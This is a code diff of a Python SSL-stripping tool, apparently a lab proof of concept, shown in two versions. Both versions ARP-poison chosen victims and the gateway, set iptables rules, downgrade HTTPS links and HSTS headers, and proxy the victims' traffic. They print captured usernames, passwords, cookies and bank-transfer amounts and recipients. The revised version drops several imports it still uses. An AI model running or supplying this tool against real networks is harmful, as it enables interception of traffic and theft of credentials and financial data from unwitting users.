@@ -1,112 +1,67 @@
 from scapy.all import *
 from scapy.layers.inet import TCP, IP
 from scapy.layers.l2 import ARP, Ether
-import os, sys, time, threading, re, argparse
+import requests
 
-# network config
-IFACE = conf.iface  # Default interface
-GATEWAY = conf.route.route('0.0.0.0')[2]  # Default gateway
-TARGET_SERVER = None  # Can be set from command line
+IFACE = conf.iface
+GATEWAY = conf.route.route('0.0.0.0')[2]
+TARGET_SERVER = None
+VICTIMS = []
+session = requests.Session()
 
-# global session for cookies
-session = None
+cooldown_dict = {}
+COOLDOWN_TIME = 10
 
 
 def parse_arguments():
-    """Parse command line arguments and return parsed args"""
-    parser = argparse.ArgumentParser(description='SSL Stripping Attack Tool')
-    victim_group = parser.add_mutually_exclusive_group(required=True)
-
-    parser.add_argument('-i', '--interface', type=str, help='Network interface to use')
-    victim_group.add_argument('-t', '--target', type=str, help='IP address of single target victim')
-    victim_group.add_argument('-v', '--victim', nargs=2, type=str, help='IP addresses of two target victims')
-    parser.add_argument('-s', '--server', type=str, help='IP address of target server')
-
-    return parser.parse_args()
+    p = argparse.ArgumentParser(description='SSL-Strip POC')
+    vg = p.add_mutually_exclusive_group(required=True)
+    p.add_argument( '-i', '--interface',      help='Net iface')
+    vg.add_argument('-t', '--target',         help='Single IP')
+    vg.add_argument('-v', '--victim',nargs=2, help='Two IPs')
+    p.add_argument( '-s', '--server',         help='Target server IP')
+    return p.parse_args()
 
 
 def setup_system():
-    """setup iptables and forwarding"""
-    print(" Setting up system...")
+    print("Setting up iptables...")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # enable ip forwarding
+    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP") # drop RST packets so kernel doesnt mess with our hijacking of connections
 
-    # enable forwarding
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    for v in VICTIMS:
+        # delete the already established connections
+        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
+        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")
 
-    # block RST so our OS doesn't mess with our packets
-    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
-
-    # block victim's packets after handshake so we can inject ours
-    for victim in VICTIM:
-        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
-        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")
-
-    # allow handshake to complete
-    for victim in VICTIM:
-        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
-        os.system(f"iptables -I FORWARD -s {victim} -p tcp --dport 443 -m state --state NEW -j ACCEPT")
+        # allow new connections
+        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
+        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 443 -m state --state NEW -j ACCEPT")
 
     print("""
-$$\       $$$$$$$$\ $$$$$$$$\       $$$$$$$$\ $$\   $$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$$\  $$$$$$\  
-$$ |      $$  _____|\__$$  __|      \__$$  __|$$ |  $$ |$$  _____|      $$  __$$\ $$  __$$\ $$$\    $$$ |$$  _____|$$  __$$\ 
+$$\       $$$$$$$$\ $$$$$$$$\       $$$$$$$$\ $$\   $$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$$\  $$$$$$\
+$$ |      $$  _____|\__$$  __|      \__$$  __|$$ |  $$ |$$  _____|      $$  __$$\ $$  __$$\ $$$\    $$$ |$$  _____|$$  __$$\
 $$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ /  \__|$$ /  $$ |$$$$\  $$$$ |$$ |      $$ /  \__|
-$$ |      $$$$$\       $$ |            $$ |   $$$$$$$$ |$$$$$\          $$ |$$$$\ $$$$$$$$ |$$\$$\$$ $$ |$$$$$\    \$$$$$$\  
-$$ |      $$  __|      $$ |            $$ |   $$  __$$ |$$  __|         $$ |\_$$ |$$  __$$ |$$ \$$$  $$ |$$  __|    \____$$\ 
+$$ |      $$$$$\       $$ |            $$ |   $$$$$$$$ |$$$$$\          $$ |$$$$\ $$$$$$$$ |$$\$$\$$ $$ |$$$$$\    \$$$$$$\
+$$ |      $$  __|      $$ |            $$ |   $$  __$$ |$$  __|         $$ |\_$$ |$$  __$$ |$$ \$$$  $$ |$$  __|    \____$$\
 $$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |      $$\   $$ |
 $$$$$$$$\ $$$$$$$$\    $$ |            $$ |   $$ |  $$ |$$$$$$$$\       \$$$$$$  |$$ |  $$ |$$ | \_/ $$ |$$$$$$$$\ \$$$$$$  |
-\________|\________|   \__|            \__|   \__|  \__|\________|       \______/ \__|  \__|\__|     \__|\________| \______/ 
+\________|\________|   \__|            \__|   \__|  \__|\________|       \______/ \__|  \__|\__|     \__|\________| \______/
 
 
 
-$$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$\   $$\                                                                              
-$$  __$$\ $$  _____|$$  __$$\ \_$$  _|$$$\  $$ |                                                                             
-$$ |  $$ |$$ |      $$ /  \__|  $$ |  $$$$\ $$ |                                                                             
-$$$$$$$\ |$$$$$\    $$ |$$$$\   $$ |  $$ $$\$$ |                                                                             
-$$  __$$\ $$  __|   $$ |\_$$ |  $$ |  $$ \$$$$ |                                                                             
-$$ |  $$ |$$ |      $$ |  $$ |  $$ |  $$ |\$$$ |                                                                             
-$$$$$$$  |$$$$$$$$\ \$$$$$$  |$$$$$$\ $$ | \$$ |                                                                             
-\_______/ \________| \______/ \______|\__|  \__|                                                                             
-
-
-
+$$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$\   $$\
+$$  __$$\ $$  _____|$$  __$$\ \_$$  _|$$$\  $$ |
+$$ |  $$ |$$ |      $$ /  \__|  $$ |  $$$$\ $$ |
+$$$$$$$\ |$$$$$\    $$ |$$$$\   $$ |  $$ $$\$$ |
+$$  __$$\ $$  __|   $$ |\_$$ |  $$ |  $$ \$$$$ |
+$$ |  $$ |$$ |      $$ |  $$ |  $$ |  $$ |\$$$ |
+$$$$$$$  |$$$$$$$$\ \$$$$$$  |$$$$$$\ $$ | \$$ |
+\_______/ \________| \______/ \______|\__|  \__|
 """)
     return True
 
 
-def cleanup_system():
-    """restore everything"""
-    # remove rules
-    os.system("iptables -F")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-
-    # fix arp - get MACs for all victims
-    victim_macs = []
-    for victim in VICTIM:
-        mac = get_mac(victim)
-        victim_macs.append((victim, mac))
-
-    g_mac = get_mac(GATEWAY)
-
-    # Restore ARP for each victim
-    if g_mac:
-        for victim_ip, victim_mac in victim_macs:
-            if victim_mac:
-                send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
-                send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
-
-                # restore server ARP if specified
-                if TARGET_SERVER:
-                    s_mac = get_mac(TARGET_SERVER)
-                    if s_mac:
-                        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=TARGET_SERVER, hwsrc=s_mac), count=5,
-                             verbose=0)
-                        send(ARP(op=2, pdst=TARGET_SERVER, hwdst=s_mac, psrc=victim_ip, hwsrc=victim_mac), count=5,
-                             verbose=0)
-
-        print("Network restored to original state")
-
-
 def get_mac(ip):
-    """get mac from ip"""
     try:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=IFACE)
         if ans:
@@ -116,364 +71,177 @@ def get_mac(ip):
     return None
 
 
-def arp_spoof(target_ip, gateway_ip, interface, stop_event, server_ip=None):
-    """arp poisoning loop"""
-    v_mac = get_mac(target_ip)
-    g_mac = get_mac(gateway_ip)
+def cleanup_system():
+    print("\nRestoring network...")
+    os.system("iptables -F")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-    if not v_mac or not g_mac:
-        print(" Can't get MACs")
+    g_mac = get_mac(GATEWAY)
+    for v_ip in VICTIMS:
+        v_mac = get_mac(v_ip)
+        if v_mac and g_mac:
+            send(ARP(op=2, pdst=v_ip, hwdst=v_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
+            send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=v_ip, hwsrc=v_mac), count=5, verbose=0)
+
+
+def arp_spoof(target, gw, iface, stop_event, server=None):
+    t_mac, g_mac = get_mac(target), get_mac(gw)
+    if not t_mac or not g_mac:
         return
 
-    # Get server MAC if spoofing a specific server
-    s_mac = None
-    if server_ip:
-        s_mac = get_mac(server_ip)
-        if not s_mac:
-            print(f" Can't get MAC for server {server_ip}")
-        else:
-            print(f" ARP Spoofing: (Target:){target_ip} <-> (Gateway:){gateway_ip} + (Server:){server_ip}")
-    else:
-        print(f" ARP Spoofing: (Target:){target_ip} <-> (Gateway:){gateway_ip}")
+    s_mac = get_mac(server) if server else None
 
     while not stop_event.is_set():
-        try:
-            # spoof victim (make victim think we are the gateway)
-            send(ARP(op=2, pdst=target_ip, hwdst=v_mac, psrc=gateway_ip), verbose=0, iface=interface)
-            # spoof gateway (make gateway think we are the victim)
-            send(ARP(op=2, pdst=gateway_ip, hwdst=g_mac, psrc=target_ip), verbose=0, iface=interface)
+        send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw), verbose=0, iface=iface) # poison victim
+        send(ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target), verbose=0, iface=iface) # poison gateway
 
-            # if spoofing a specific server on the local subnet
-            if server_ip and s_mac:
-                # make victim think we are the server
-                send(ARP(op=2, pdst=target_ip, hwdst=v_mac, psrc=server_ip), verbose=0, iface=interface)
-                # make server think we are the victim
-                send(ARP(op=2, pdst=server_ip, hwdst=s_mac, psrc=target_ip), verbose=0, iface=interface)
-
-            time.sleep(0.3)
-        except:
-            break
+        if server and s_mac:
+            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=server), verbose=0, iface=iface)
+            send(ARP(op=2, pdst=server, hwdst=s_mac, psrc=target), verbose=0, iface=iface)
+        time.sleep(2)
 
 
-def strip_https(html_msg):
-    """strip https links from html"""
-    if not html_msg:
-        return html_msg
-
-    # replace https with http
-    html_msg = re.sub(r'https://', 'http://', html_msg, flags=re.IGNORECASE)
-    html_msg = re.sub(r'wss://', 'ws://', html_msg, flags=re.IGNORECASE)
-
-    # remove security stuff
-    html_msg = re.sub(r'<meta[^>]*Strict-Transport-Security[^>]*>', '', html_msg, flags=re.IGNORECASE)
-    html_msg = re.sub(r'<meta[^>]*upgrade-insecure-requests[^>]*>', '', html_msg, flags=re.IGNORECASE)
-
-    # fix js
-    html_msg = re.sub(r"'https://", "'http://", html_msg)
-    html_msg = re.sub(r'"https://', '"http://', html_msg)
-
-    return html_msg
+def strip_https(data):
+    if not data:
+        return data
+    data = data.replace('https://', 'http://').replace('wss://', 'ws://')
+    data = re.sub(r'Strict-Transport-Security', 'X-Stripped-HSTS', data, flags=re.I)
+    return data
 
 
-def https_fetch(url, headers=None, method="GET", body=None):
-    """fetch content from https server"""
-    import requests
-    requests.packages.urllib3.disable_warnings()
-
-    global session
-    if session is None:
-        session = requests.Session()
-
+def https_fetch(url, headers, method="GET", body=None):
     try:
         if method == "POST":
             r = session.post(url, headers=headers, data=body, verify=False, timeout=5)
         else:
             r = session.get(url, headers=headers, verify=False, timeout=5)
         return r.status_code, r.headers, r.text
-    except Exception as e:
-        print(f" HTTPS fetch error: {e}")
+    except:
         return None, None, None
 
 
-def http_send(pkt, content, interface):
-    """inject fake http response"""
-    # strip links
+def http_send(pkt, content):
     body = strip_https(content)
+    resp = (f"HTTP/1.1 200 OK\r\nServer: Apache\r\nContent-Type: text/html\r\n"
+            f"Connection: close\r\nContent-Length: {len(body)}\r\n\r\n{body}")
 
-    # build response
-    resp = "HTTP/1.1 200 OK\r\n"
-    resp += "Server: Apache\r\n"
-    resp += "Content-Type: text/html\r\n"
-    resp += "Connection: close\r\n"
-    resp += f"Content-Length: {len(body)}\r\n\r\n{body}"
-
-    # tcp math
     ack = pkt[TCP].seq + len(pkt[TCP].payload)
-    seq = pkt[TCP].ack
-
-    # inject response
-    reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-            TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=seq, ack=ack) / \
-            Raw(load=resp)
-
-    send(reply, verbose=0, iface=interface)
-
-    # close connection
-    fin = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
-          TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="FA", seq=seq + len(resp), ack=ack)
-    send(fin, verbose=0, iface=interface)
-
-    return True
+    reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA",
+                                                       seq=pkt[TCP].ack, ack=ack) / Raw(load=resp)
+    send(reply, verbose=0, iface=IFACE)
 
 
-def parse_http(data):
-    """parse http request"""
-    lines = data.split('\r\n')
-    parts = lines[0].split(' ')
-
-    if len(parts) < 2:
-        return None, None, None, None
-
-    method = parts[0]
-    path = parts[1]
-
-    # get headers
-    headers = {}
-    body = ""
-    body_started = False
-
-    for line in lines[1:]:
-        if body_started:
-            body += line + '\r\n'
-        elif line == "":
-            body_started = True
-        elif ": " in line:
-            k, v = line.split(': ', 1)
-            headers[k] = v
-
-    return method, path, headers, body.strip()
+def extract_creds(body):
+    res = []
+    for pair in body.split('&'):
+        if '=' in pair:
+            k, v = pair.split('=', 1)
+            if any(x in k.lower() for x in ['user', 'pass', 'login', 'email', 'pwd']):
+                res.append(f"{k}: {v}")
+    return " | ".join(res) if res else None
 
 
-def extract_credentials(body, method):
-    """extract username and password from POST data"""
-    if method != "POST" or not body:
-        return None, None
-
-    credentials = {}
-
-    # Parse URL-encoded form data
+def extract_amount(body):
     try:
-        pairs = body.split('&')
-        for pair in pairs:
+        for pair in body.split('&'):
             if '=' in pair:
-                key, value = pair.split('=', 1)
-                # URL decode
-                import urllib.parse
-                key = urllib.parse.unquote_plus(key)
-                value = urllib.parse.unquote_plus(value)
-                credentials[key.lower()] = value
+                k,v = pair.split('=',1)
+                if 'amount' in k.lower():
+                    return v
     except:
-        return None, None
-
-    # Look for common credential field names
-    username = None
-    password = None
-
-    # Common username fields
-    for field in ['username', 'user', 'email', 'login', 'userid', 'user_name']:
-        if field in credentials:
-            username = credentials[field]
-            break
-
-    # Common password fields
-    for field in ['password', 'pass', 'pwd', 'passwd']:
-        if field in credentials:
-            password = credentials[field]
-            break
-
-    return username, password
+        pass
+    return None
 
 
 def handle_packet(pkt):
-    """process intercepted packets"""
-    for VICTIM1 in VICTIM:
-        if not pkt.haslayer(Raw):
-            return
-
-        # only victim traffic
-        if pkt[IP].src != VICTIM1 or pkt[TCP].dport not in [80, 443]:
-            return
-
-        try:
-            data = pkt[Raw].load.decode('utf-8', errors='ignore')
-
-            # Quick check: if this packet contains form data, try to extract credentials
-            # This catches cases where POST body is in a separate packet
-            if 'username=' in data.lower() or 'password=' in data.lower():
-                import urllib.parse
-                try:
-                    # Try to parse as form data
-                    fields = {}
-                    for pair in data.split('&'):
-                        if '=' in pair:
-                            key, value = pair.split('=', 1)
-                            key = urllib.parse.unquote_plus(key)
-                            value = urllib.parse.unquote_plus(value)
-                            fields[key.lower()] = value
-
-                    if 'username' in fields or 'password' in fields:
-                        print("\n" + "=" * 60)
-                        print("CREDENTIALS SUCCESSFULLY CAPTURED!!!")
-                        print(f"    Source: {pkt[IP].src}")
-                        print(f"    Destination: {pkt[IP].dst}:{pkt[TCP].dport}")
-                        if 'username' in fields:
-                            print(f"    Username: {fields['username']}")
-                        if 'password' in fields:
-                            print(f"    Password: {fields['password']}")
-                        print("=" * 60 + "\n")
-                except:
-                    pass
-
-            # check if http request
-            if "GET " not in data and "POST " not in data:
-                return
-
-            # parse it
-            method, path, headers, body = parse_http(data)
-            if not headers:
-                return
-
-            host = headers.get('Host')
-            if not host:
-                return
-
-            # Extract and display credentials if POST request
-            if method == "POST":
-                print(f"[*] POST request detected to {host}{path}")
-                print(f"[*] Body length: {len(body)} bytes")
-                if body:
-                    print(f"[*] Body preview: {body[:200]}")
-
-                username, password = extract_credentials(body, method)
-                if username or password:
-                    print("\n" + "=" * 60)
-                    print("!!! CREDENTIALS CAPTURED !!!")
-                    print(f"    Host: {host}")
-                    print(f"    Path: {path}")
-                    if username:
-                        print(f"    Username: {username}")
-                    if password:
-                        print(f"    Password: {password}")
-                    print("=" * 60 + "\n")
-                else:
-                    print(f" POST detected but no credentials found in body")
-
-            # no compression
-            if 'Accept-Encoding' in headers:
-                del headers['Accept-Encoding']
-
-            try:
-                # fetch from https
-                url = f"https://{host}{path}"
-                print(f" {method} {url}")
-
-                # Forward POST data or do GET request
-                status, resp_headers, resp_body = https_fetch(url, headers, method=method, body=body)
-
-                if resp_body:
-                    # check for cookies
-                    if resp_headers and 'Set-Cookie' in resp_headers:
-                        print(f"[+] Grabbed cookies from {host}")
-
-                    # inject fake response
-                    http_send(pkt, resp_body, IFACE)
-                    print(f"[+] Stripped {host}")
-
-            except Exception as e:
-                print(f"[!] Error: {e}")
-
-        except:
-            pass
-
-
-def main():
-    global IFACE, VICTIM, TARGET_SERVER
-
-    # Parse command line arguments
-    args = parse_arguments()
-
-    # Update global variables with command line arguments
-    if args.interface:
-        IFACE = args.interface
-
-    # Handle single target or dual victims
-    if args.target:
-        VICTIM = [args.target]  # Single victim mode
-    else:
-        VICTIM = args.victim  # Dual victim mode
-
-    if args.server:
-        TARGET_SERVER = args.server
-
-    print("=" * 50)
-    print(" SSL Stripping Attack Demo")
-    print("=" * 50)
-    print(f"Interface: {IFACE}")
-    if len(VICTIM) == 1:
-        print(f"Target: {VICTIM[0]}")
-    else:
-        print(f"Victim1: {VICTIM[0]}")
-        print(f"Victim2: {VICTIM[1]}")
-    print(f"Gateway: {GATEWAY}")
-    if TARGET_SERVER:
-        print(f"Target Server: {TARGET_SERVER}")
-    print("=" * 50)
-
-    # setup
-    if not setup_system():
-        sys.exit(1)
-
-    # start arp spoofing threads for each victim
-    threads = []
-    stop_events = []
-
-    for victim in VICTIM:
-        stop_event = threading.Event()
-        thread = threading.Thread(target=arp_spoof, args=(victim, GATEWAY, IFACE, stop_event, TARGET_SERVER))
-        thread.daemon = True
-        thread.start()
-        threads.append(thread)
-        stop_events.append(stop_event)
-
-    time.sleep(3)
-
-    print("\n[*] Sniffing traffic...")
-
-    # Build filter for all victims
-    victim_filter = " or ".join([f"src host {victim}" for victim in VICTIM])
-    filter_string = f"tcp and ({victim_filter})"
+    if not pkt.haslayer(Raw) or pkt[IP].src not in VICTIMS:
+        return
 
     try:
-        sniff(iface=IFACE, filter=filter_string, prn=handle_packet, store=0)
-    except KeyboardInterrupt:
-        print("\n Stopping...")
-    finally:
-        # Stop all threads
-        for stop_event in stop_events:
-            stop_event.set()
-        for thread in threads:
-            thread.join(timeout=5)
-        cleanup_system()
-        print("""
-            $$$$$$\       $$\   $$\  $$$$$$\  $$\    $$\ $$$$$$$$\        $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\   $$\ 
-            \_$$  _|      $$ |  $$ |$$  __$$\ $$ |   $$ |$$  _____|      $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$$\  $$ |
-              $$ |        $$ |  $$ |$$ /  $$ |$$ |   $$ |$$ |            $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |$$  / $$ |      $$$$\ $$ |
-              $$ |        $$$$$$$$ |$$$$$$$$ |\$$\  $$  |$$$$$\          \$$$$$$\  $$$$$$$  |$$ |  $$ |$$$$$  /  $$$$$\    $$ $$\$$ |
-              $$ |        $$  __$$ |$$  __$$ | \$$\$$  / $$  __|          \____$$\ $$  ____/ $$ |  $$ |$$  $$<   $$  __|   $$ \$$$$ |
-              $$ |        $$ |  $$ |$$ |  $$ |  \$$$  /  $$ |            $$\   $$ |$$ |      $$ |  $$ |$$ |\$$\  $$ |      $$ |\$$$ |
-            $$$$$$\       $$ |  $$ |$$ |  $$ |   \$  /   $$$$$$$$\       \$$$$$$  |$$ |       $$$$$$  |$$ | \$$\ $$$$$$$$\ $$ | \$$ |
-            \______|      \__|  \__|\__|  \__|    \_/    \________|       \______/ \__|       \______/ \__|  \__|\________|\__|  \__|""")
+        data = pkt[Raw].load.decode(errors='ignore')
+        if "GET " not in data and "POST " not in data:
+            return
+
+        lines = data.split('\r\n')
+        method, path, _ = lines[0].split(' ')
+        headers = {l.split(': ')[0]: l.split(': ')[1] for l in lines[1:] if ': ' in l}
+        host = headers.get('Host')
+        if not host:
+            return
+
+        body = data.split('\r\n\r\n')[1] if '\r\n\r\n' in data else ""
+
+        if method == "POST":
+            key = f"{pkt[IP].src}:{host}{path}"
+            curr_time = time.time()
+
+            if key in cooldown_dict:
+                elapsed = curr_time - cooldown_dict[key]
+                if elapsed < COOLDOWN_TIME:
+                    return
+
+            cooldown_dict[key] = curr_time
+
+            creds = extract_creds(body)
+            amt = extract_amount(body)
+
+            if creds and 'login' in path.lower() or 'signin' in path.lower():
+                print(f"\nCAPTURED CREDS: {host}{path}\n    {creds}\n")
+
+            if amt and 'transfer' in path.lower():
+                print(f"\n TRANSFER DETECTED: ${amt}")
+                for pair in body.split('&'):
+                    if '=' in pair:
+                        k,v = pair.split('=',1)
+                        if 'target' in k.lower() or 'recipient' in k.lower():
+                            print(f"    To: {v}")
+                            break
+                print()
+
+        url = f"https://{host}{path}"
+        if 'Accept-Encoding' in headers:
+            del headers['Accept-Encoding']
+
+        _, _, resp_text = https_fetch(url, headers, method, body)
+        if resp_text:
+            http_send(pkt, resp_text)
+    except Exception as e:
+        pass
 
 
 if __name__ == "__main__":
-    main()
+    global IFACE, VICTIMS, TARGET_SERVER
+    args = parse_arguments()
+
+    if args.interface:
+        IFACE = args.interface
+    VICTIMS = [args.target] if args.target else args.victim
+    if args.server:
+        TARGET_SERVER = args.server
+
+    if not setup_system():
+        sys.exit(1)
+
+    stop_event = threading.Event()
+    for v in VICTIMS:
+        threading.Thread(target=arp_spoof, args=(v, GATEWAY, IFACE, stop_event, TARGET_SERVER), daemon=True).start()
+
+    print(f"Sniffing packets...")
+    print(f"Victims: {', '.join(VICTIMS)}")
+    try:
+        v_filter = " or ".join([f"src host {v}" for v in VICTIMS])
+        sniff(iface=IFACE, filter=f"tcp and ({v_filter})", prn=handle_packet, store=0)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop_event.set()
+        cleanup_system()
+        print("""
+                $$$$$$\       $$\   $$\  $$$$$$\  $$\    $$\ $$$$$$$$\        $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\   $$\
+                \_$$  _|      $$ |  $$ |$$  __$$\ $$ |   $$ |$$  _____|      $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$$\  $$ |
+                  $$ |        $$ |  $$ |$$ /  $$ |$$ |   $$ |$$ |            $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |$$  / $$ |      $$$$\ $$ |
+                  $$ |        $$$$$$$$ |$$$$$$$$ |\$$\  $$  |$$$$$\          \$$$$$$\  $$$$$$$  |$$ |  $$ |$$$$$  /  $$$$$\    $$ $$\$$ |
+                  $$ |        $$  __$$ |$$  __$$ | \$$\$$  / $$  __|          \____$$\ $$  ____/ $$ |  $$ |$$  $$<   $$  __|   $$ \$$$$ |
+                  $$ |        $$ |  $$ |$$ |  $$ |  \$$$  /  $$ |            $$\   $$ |$$ |      $$ |  $$ |$$ |\$$\  $$ |      $$ |\$$$ |
+                $$$$$$\       $$ |  $$ |$$ |  $$ |   \$  /   $$$$$$$$\       \$$$$$$  |$$ |       $$$$$$  |$$ | \$$\ $$$$$$$$\ $$ | \$$ |
+                \______|      \__|  \__|\__|  \__|    \_/    \________|       \______/ \__|       \______/ \__|  \__|\________|\__|  \__|""")
